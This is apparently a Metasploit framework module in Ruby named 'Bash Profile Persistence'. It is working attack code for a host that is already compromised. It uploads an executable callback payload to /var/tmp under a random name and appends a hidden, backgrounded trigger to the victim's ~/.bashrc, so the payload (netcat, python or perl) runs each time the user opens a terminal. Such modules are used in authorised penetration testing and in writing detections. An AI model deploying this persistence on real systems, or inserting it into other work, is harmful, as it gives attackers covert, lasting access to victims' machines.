##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
    Rank = NormalRanking
    include Msf::Post::Common
    include Msf::Post::File
    include Msf::Post::Unix

    def initialize(info = {})
      super(
        update_info(
          info,
          'Name'           => 'Bash Profile Persistence',
          'Description'    => %q(
            This module writes an execution trigger to the target's Bash profile.
            The execution trigger executes a call back payload whenever the target
            user opens a Bash terminal. A handler is not run automatically, so you 
            must configure an appropriate exploit/multi/handler to receive the callback.
          ),
          'License'        => MSF_LICENSE,
          'Author'         =>
            [
              'Michael Long <bluesentinel[at]protonmail.com>'
            ],
          'DisclosureDate' => 'Jun 8 1989', # First public release of Bourne Again Shell
          'Platform'       => ['unix', 'linux'],
          'Arch'           => ARCH_CMD,
          'SessionTypes'   => ['meterpreter'],
          'DefaultOptions' => { 'WfsDelay' => 0, 'DisablePayloadHandler' => 'true' },
          'Targets'        =>
            [
              ['Automatic', {}]
            ],

          'DefaultTarget'  => 0,
          'Payload'        => {
            'Compat'       =>
            {
              'PayloadType'  => 'cmd',
              'RequiredCmd'  => 'generic python netcat perl'
            }
          },
          'References'     =>
          [
            ['URL', 'https://attack.mitre.org/techniques/T1156/']
          ]
        )
    )

      register_options(
        [
          OptString.new('BASH_PROFILE', [true, 'Target Bash profile location. Usually ~/.bashrc or ~/.bash_profile.','~/.bashrc']),
          OptString.new('PAYLOAD_FILE_PATH', [true, 'Path to write persistent payload file.','/var/tmp/'])
        ], self.class
    )
    end
  
    def exploit

      # expand home directory path: ~/ becomes /home/user/
      profilePath = datastore['BASH_PROFILE']
      if profilePath == '~/.bashrc'
        expandedPath = session.sys.config.getenv('$HOME')
        profilePath = expandedPath + "/.bashrc"
      end

      # check that target Bash profile file exists
      if not exist?(profilePath)
        fail_with Failure::NotFound, profilePath
      end
      print_status("Bash profile exists: #{profilePath}")

      # check that target Bash profile file is writable
      if not writable?(profilePath)
        fail_with Failure::NoAccess, profilePath
      end
      print_status("Bash profile is writable: #{profilePath}")
    
      # create Bash profile backup on local system
      backupProfile = read_file(profilePath)
      logFileName = create_backup_file(backupProfile)
      print_status("Created backup Bash profile: #{logFileName}")

      # upload persistent payload to target and make executable (chmod 700)
      payloadFile = datastore['PAYLOAD_FILE_PATH'] + Rex::Text.rand_text_alpha(10..16)
      upload_and_chmodx(payloadFile, payload.encoded)

      # write payload trigger to Bash profile
      execPayloadString = "#{payloadFile} > /dev/null 2>&1 &" # payload stdin, stdout, stderr are sent to /dev/null
      append_file(profilePath, execPayloadString)
      print_good("Wrote payload trigger to Bash profile")
      print_warning("Payload will be triggered when target opens a Bash terminal")
      


    end
    def create_backup_file(backupProfile)
      # Get hostname
      host = session.sys.config.sysinfo["Computer"]
  
      # Create Filename info to be appended to downloaded files
      filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%H%M%S")
  
      # Create a directory for the logs
      logs = ::File.join(Msf::Config.log_directory, 'persistence/' + host + filenameinfo)
  
      # Create the log directory
      ::FileUtils.mkdir_p(logs)
  
      fileName = logs + "_Bash_Profile.backup"
      file_local_write(fileName, backupProfile)
      return fileName

    end
end